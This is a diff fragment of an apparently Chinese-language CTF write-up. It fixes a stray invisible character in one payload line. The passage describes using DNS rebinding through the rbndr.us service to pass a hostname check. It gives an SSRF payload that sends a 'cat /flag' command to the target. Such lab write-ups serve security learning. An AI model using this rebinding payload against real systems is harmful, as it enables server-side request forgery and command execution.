@@ -62,7 +62,7 @@ if __name__ == '__main__':
 就是要通过让hostname==114.5.1.4      数字绕过好像都不行，用的DNS 重绑定  
 这个地址**https://lock.cmpxchg8b.com/rebinder.html**
 
-​`payload：ssrf?url=http://72050104.c0a80001.rbndr.us&cmd=cat /flag`
+`payload：ssrf?url=http://72050104.c0a80001.rbndr.us&cmd=cat /flag`
 
 ## 你好，⽖洼脚本
 
